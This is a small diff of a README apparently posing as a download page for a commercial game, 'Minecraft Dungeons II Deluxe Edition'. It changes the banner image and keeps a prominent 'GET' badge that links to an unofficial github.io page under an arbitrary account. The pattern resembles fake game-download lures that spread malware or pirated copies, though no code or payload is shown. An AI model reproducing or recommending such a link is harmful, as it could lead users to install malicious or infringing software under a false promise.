@@ -1,6 +1,6 @@
 # Minecraft Dungeons II Deluxe Edition — Action RPG, Gear Customization & Co-op Adventure
 
-![Banner Placeholder](https://www.minecraft.net/content/dam/minecraftnet/games/spicewood/key-art/Hero-Image_Dungeons-Deluxe_1200x675.jpg)
+![Banner Placeholder](https://store-images.s-microsoft.com/image/apps.20471.13596461372408012.94cfead7-27a0-44f4-8127-77eac62fa825.cce7ba30-0903-4148-b84d-6837755204a9)
 
 [![GET — Minecraft Dungeons II](https://img.shields.io/badge/GET%20%E2%80%94%20Minecraft%20Dungeons%20II-0078D6?style=for-the-badge&logoColor=white)](https://e39318402.github.io/.github/Minecraft-Dungeons-II-Deluxe-Edition)
 
